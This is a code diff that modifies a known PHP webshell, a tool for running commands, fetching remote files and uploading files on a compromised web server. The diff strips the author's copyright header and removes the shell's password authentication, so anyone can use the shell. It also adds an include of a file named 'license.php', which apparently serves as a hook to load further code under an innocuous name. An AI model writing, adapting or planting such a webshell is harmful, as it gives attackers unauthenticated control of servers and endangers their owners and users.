@@ -1,46 +1,11 @@
 #<?php
-/*******************************************************************************
- * Copyright 2017 WhiteWinterWolf
- * https://www.whitewinterwolf.com/tags/php-webshell/
- *
- * This file is part of wwolf-php-webshell.
- *
- * wwwolf-php-webshell is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <http://www.gnu.org/licenses/>.
- ******************************************************************************/
 
-/*
- * Optional password settings.
- * Use the 'passhash.sh' script to generate the hash.
- * NOTE: the prompt value is tied to the hash!
- */
-$passprompt = "WhiteWinterWolf's PHP webshell: ";
-$passhash = "";
+if(file_exists('license.php'))
+{
+	include 'license.php';
+}
 
 function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }
-
-function h($s)
-{
-	global $passprompt;
-	if (function_exists('hash_hmac'))
-	{
-		return hash_hmac('sha256', $s, $passprompt);
-	}
-	else
-	{
-		return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
-	}
-}
 
 function fetch_fopen($host, $port, $src, $dst)
 {
@@ -147,29 +112,6 @@ $ok = '&#9786; :';
 $warn = '&#9888; :';
 $err = '&#9785; :';
 
-if (! empty($passhash))
-{
-	if (function_exists('hash_hmac') || function_exists('mhash'))
-	{
-		$auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
-		if (h($auth) !== $passhash)
-		{
-			?>
-				<form method="post" action="<?php e($url); ?>">
-					<?php e($passprompt); ?>
-					<input type="password" size="15" name="pass">
-					<input type="submit" value="Send">
-				</form>
-			<?php
-			exit;
-		}
-	}
-	else
-	{
-		$status .= "${warn} Authentication disabled ('mhash()' missing).<br />";
-	}
-}
-
 if (! ini_get('allow_url_fopen'))
 {
 	ini_set('allow_url_fopen', '1');
@@ -221,14 +163,17 @@ if (ini_get('file_uploads') && ! empty($_FILES['upload']))
 }
 ?>
 
+<script>
+	document.addEventListener("DOMContentLoaded", (event) => {
+		document.getElementById("cmd").focus();
+	});
+</script>
+
 <form method="post" action="<?php e($url); ?>"
 	<?php if (ini_get('file_uploads')): ?>
 		enctype="multipart/form-data"
 	<?php endif; ?>
 	>
-	<?php if (! empty($passhash)): ?>
-		<input type="hidden" name="auth" value="<?php e($auth); ?>">
-	<?php endif; ?>
 	<table border="0">
 		<?php if (! empty($fetch_func)): ?>
 			<tr><td>
